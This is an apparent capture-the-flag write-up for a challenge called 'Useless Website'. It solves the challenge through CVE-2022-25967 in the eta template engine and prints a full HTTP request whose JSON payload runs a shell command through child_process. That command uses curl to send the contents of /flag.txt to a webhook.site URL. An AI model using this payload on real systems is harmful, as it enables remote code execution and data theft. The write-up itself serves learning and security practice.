# Useless Website
## Step by Step Solve
---
1. Download the source code of the website
2. We can see theres something in the package.json file
   - ![image](https://github.com/user-attachments/assets/ded38f60-d45c-406f-87ca-353241b395e5)
3. Searching on the internet ```CVE-2022-25967``` showing that there is some leakage can be use on the eta framework.
4. In burpsuite, intercept the web and change to this
``` POST /utils/settings HTTP/1.1
    Host: 5.75.155.50:1341
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Connection: keep-alive
    Content-Type: application/json
    Upgrade-Insecure-Requests: 1
    If-None-Match: W/"1057-ih1IUXlwncna8aHynJLYIHjiX30"
    Priority: u=0, i
    Content-Length: 292
    
    {
      "settings": {
        "view options": {
          "varName": "x=process.mainModule.require('child_process').execSync('curl https://webhook.site/self id/$(cat /flag.txt)')",
          "include": false,
          "includeFile": false,
          "useWith": true
        }
      }
    }
```

5. And we can find out the flag at the end of the webhook link.
   - ![image](https://github.com/user-attachments/assets/ee3ce174-09de-43c1-82ea-43f979aa075d)

### Acknowledgement
Thx for Megat for the solution.
